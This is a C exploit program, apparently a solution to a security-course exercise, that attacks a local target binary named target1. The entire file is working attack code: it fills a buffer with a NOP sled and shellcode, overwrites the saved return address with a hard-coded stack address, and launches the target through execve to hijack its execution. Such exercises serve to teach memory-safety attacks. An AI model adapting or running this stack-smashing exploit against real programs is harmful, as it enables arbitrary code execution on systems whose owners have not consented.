#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define STACK_ADDR 0x202dfe80
#define LOCAL_SIZE 112
#define EBP_SIZE 8
#define RET_SIZE 8
#define BUFF_SIZE (LOCAL_SIZE + EBP_SIZE + RET_SIZE)

int
main ( int argc, char * argv[] )
{

	char buff[BUFF_SIZE + 1];
	int i;
	int shell_size = sizeof(shellcode) - 1;

	// fill first half with NOP
	for (i = 0; i < BUFF_SIZE - shell_size; i++){
		buff[i] = 0x90; // NOP
	}

	// copy shell code
	for (i = 0; i < shell_size; i++){
		buff[BUFF_SIZE - RET_SIZE - shell_size + i] = shellcode[i];
	}

	// calcualte stack target address
	int target = STACK_ADDR - LOCAL_SIZE;
	buff[BUFF_SIZE - RET_SIZE] = (char) (target & 0xff);
	buff[BUFF_SIZE - RET_SIZE + 1] = (char) ((target >> 8) & 0xff);
	buff[BUFF_SIZE - RET_SIZE + 2] = (char) ((target >> 16) & 0xff);
	buff[BUFF_SIZE - RET_SIZE + 3] = (char) ((target >> 24) & 0xff);

	// terminate buff with NULL
	buff[BUFF_SIZE - RET_SIZE + 4] = '\0';

	
	char *	args[3];
	char *	env[1];

	args[0] = TARGET;
	args[1] = buff;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	

	return (0);
}